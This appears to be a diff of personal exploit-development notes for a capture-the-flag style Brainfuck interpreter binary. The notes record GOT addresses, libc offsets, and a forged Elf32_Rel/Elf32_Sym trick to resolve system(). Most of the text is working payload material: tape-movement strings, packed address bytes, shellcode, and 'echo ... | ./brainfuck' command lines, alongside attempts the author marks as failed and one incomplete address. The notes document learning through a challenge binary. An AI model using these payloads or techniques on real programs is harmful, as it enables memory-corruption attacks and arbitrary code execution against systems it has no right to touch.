@@ -1,10 +1,79 @@
-tape ptr is stored in 0x0804a080
-ptr initially stores 0x0804a0a0 (first entry)
+tape ptr is stored in 0x0804a080 (initial is 0x0804a0a0)
 case '.' is at 0x804863a
 case '-' is at 0x804862b
 GOT entry for putchar is at 0x08 04 a0 30 = 112 bytes before initial entry
 putchar itself is at 0x 08 04 84 d6
 brainfreak call to putchar is at 0x08048648
+
+file libc -> x/i system
+libc.so:    putchar     @ 0x61930               -> linked at 0xf7df2060
+            system      @ 0x3adb0 (-0x26b80)    -> linked at 0x
+            fwprintf    @ 0x61ab0 (+0x180)      -> linked at 0xf7df21d0 (+0x170)
+            putwchar    @ 0x617b0 (-0x180)      -> linked at 0xf7df1ef0 (-0x170)
+            ungetwc     @ 0x61580 (-0x3b0)      -> linked at 0xf7df1ce0 (-0x380)
+            
+            do_system                           -> linked at 0xf7dc4cb0
+            execve                              -> linked at 0xf7e5b874
+            __libc_system                       -> linked at 0xf7dc5170 (+0x2cef0)
+
+move ptr to putchar GOT entry           
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+store 0xf7dc5170: \x70\x51\xdc\xf7
+,>,>,>,
+deploy
+.
+
+run <<< $(echo -n -e "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,>,>,.\n\x70\x51\xdc\xf7\n")
+
+-------------------------------------------------------------------------------------------------------------
+failed attempt to hack the dynamic linker with a custom Elf32_Rel entry invoking lookup of the "system" symbol:
+https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf
+when a libc function fn_i is called for the first time...
+0. at program start, the loader stores the address of _dl_runtime_resolve in 
+1. 'call' jumps to plt[i]
+2. plt[i] jump to the address specified in the GOT. on the FIRST call, this address is just the next instruction in PLT[i]; later on during the dynamic linking process, this address will be overwritten with the address of the actual library function
+3. plt[i]+4 pushes i onto the stack
+4. plt[i]+8 jmps to plt[0]
+5. plt[0] pushes link_map to the stack, and jmps to _dl_runtime_resolve
+this does all the symbol lookup + fixup work
+the symbol lookup entails looking into .dynamic->DT_STRTAB to find the .dynstr section,
+    and using 'i' to index into this table for the symbol's name
+'i' itself is an offset from .rel.plt to an Elf32_Rel struct
+    Elf32_Rel contains 1. an offset to where the address of the linked function should be stored, and 2. an info field with an index j which offsets from .dynsym to an Elf32_Sym object
+        Elf32_Sym contains 1. an offset from .dynstr to a string with the symbol's name, and 2. st_value (null)
+.dynsym     at 0x080481d8   - contains Elf32_Sym's
+.dynstr     at 0x080482b8   - contains string literals
+.rel.plt    at 0x080483bc   - contains Elf32_Rel's, which contain 1. (4b) address to install fnptr 2. (1b) mode 3. (3b) index (16b) into .dynsym to appropriate Elf32_Sym obj
+
+
+distance from Elf32_Rel to .dynsym = 7888bytes = 493 spans of 16 bytes = .dynsym+0x1ed
+distance from "system" to .dynstr = 7656bytes = .dynstr+0x1de8
+
+store "system" in tape              at 0x0804a0a0, ptr now at 0x0804a0a8:
+,>,>,>,>,>,>>>
+construct Elf32_Rel struct in tape  at 0x0804a0a8, ptr now at 0x0804a0b0: -- (choose 0x0804a108 for system() install)
+,>,>,>,>,>,>,->,->
+construct Elf32_Sym struct in tape  at 0x0804a0b0, ptr now at 0x0804a0b7:
+,>,>,->,->,->,->,->,-
+move ptr to putchar GOT entry (LSB of jmp address), ptr now at 0x0804a030:
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+adjust it so it skips the 'push' instruction: (store \xdb)
+,
+shift ptr to a nearby unused slot, ptr now at 0x0804a036: 
+>>>>>>
+store offset value from .rel.plt to the custom Elf32_Rel struct, and deploy (deploying will push the value we store here to the stack):
+,.
+
+system[Elf32_Rel][Elf32_Sym]\xdb[offset from .rel.plt to Elf32_Rel, 1 byte]
+system[\x08\xa1\x04\x08\xed\x01\x01\x01][\xe8\x1d\x01\x01\x01\x01\x01\x01]\xdb\xff
+system\x08\xa1\x04\x08\xed\x01\x01\x01\xe8\x1d\x01\x01\x01\x01\x01\x01\xdb\xff
+,>,>,>,>,>,>>>,>,>,>,>,>,>,->,->,>,>,->,->,->,->,->,-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>>>>>>,.
+
+run <<< $(echo -n -e ",>,>,>,>,>,>>>,>,>,>,>,>,>,->,->,>,>,->,->,->,->,->,-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>>>>>>,.\nsystem\x08\xa1\x04\x08\xed\x01\x01\x01\xe8\x1d\x01\x01\x01\x01\x01\x01\xdb\x0a\n")
+
+
+----------------------------------------------------------------------------------------------------
+failed attempts with installing shellcode directly
 
 install shellcode, move ptr to putchar GOT entry, modify putchar GOT entry to point to shellcode, invoke '.' command to call putchar and deploy payload
 
@@ -14,8 +83,27 @@ shellcode:
     a:   31 c9                   xor    ecx,ecx         ; argv (nullptr)
     c:   31 db                   xor    ebx,ebx         ; envp (nullptr)
     e:   0f 05                   syscall
+####################################################################### fails: .dynamic is not actually writeable, even though readelf -t says it is?
+in this binary, .dynamic is writeable, so we can overwrite the DT_STRTAB entry to
+    point to a string table with an entry containing the string "system", to call libc->system()
+we'll hijack putchar, which is invoked by the brainfreak command '.', since that's reliable way to get a first-time execution of putchar
 
+('readelf -d' would show these easily)
+.dynstr nominally at 0x080482b8
+.dynamic->DT_STRTAB is at 0x08049f58
 
+store "system" in tape, pointer now at 0x0804a0a5
+,>,>,>,>,>,
+move ptr 333 bytes left, to .dynamic->DT_STRTAB -- now at 0x08049f58
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+store 0xa0a0 in lower half of .dynamic->DT_STRTAB and deploy
+,>,.
+
+,>,>,>,>,>,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,.
+system\xa0\xa0
+
+run <<< $(echo -n -e ",>,>,>,>,>,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,.\nsystem\xa0\xa0\n")
+echo -n -e ",>,>,>,>,>,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,.\nsystem\xa0\xa0\n" | ./brainfuck
 
 ######################################################################## fails: attempts to install payload into main(), which is executable but not writable
 1. install "bash" string in tape
